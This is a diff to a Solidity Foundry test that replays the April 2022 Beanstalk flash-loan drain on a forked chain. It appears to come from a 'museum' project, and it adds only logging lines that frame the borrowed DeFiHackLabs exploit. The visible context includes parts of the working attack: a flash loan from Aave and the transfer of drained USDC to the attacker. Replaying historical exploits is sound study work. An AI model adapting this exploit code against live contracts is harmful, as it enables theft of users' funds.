@@ -26,6 +26,14 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
+        // Museum frame. The lines marked "museum:" are the museum's own, added
+        // around the borrowed attack (DeFiHackLabs, see NOTICE.md). Not one line
+        // of the attack below is changed; the byte-faithful copy is
+        // Beanstalk_exp.orig.sol. The transcript's door-one page keys on these.
+        emit log_named_string("museum", "door one: the April 2022 Beanstalk drain, replayed on the fork");
+        emit log_named_uint("museum: the fork block", block.number);
+        emit log_named_decimal_uint("museum: attacker USDC before the drain", usdc.balanceOf(msg.sender), 6);
+
         address[] memory path = new address[](2);
         path[0] = uniswapv2.WETH();
         path[1] = address(bean);
@@ -79,6 +87,10 @@ contract ContractTest is Test {
         aavelendingPool.flashLoan(address(this), assets, amounts, modes, address(this), new bytes(0), 0);
         emit log_named_uint("After Flashloan repay, usdc balance of attacker:", usdc.balanceOf(address(this)));
         usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
+
+        // Museum frame, after the drain. The attacker walked in with nothing and
+        // left with this; the number is what the run produced, not typed.
+        emit log_named_decimal_uint("museum: attacker USDC after the drain", usdc.balanceOf(msg.sender), 6);
     }
 
     function executeOperation(
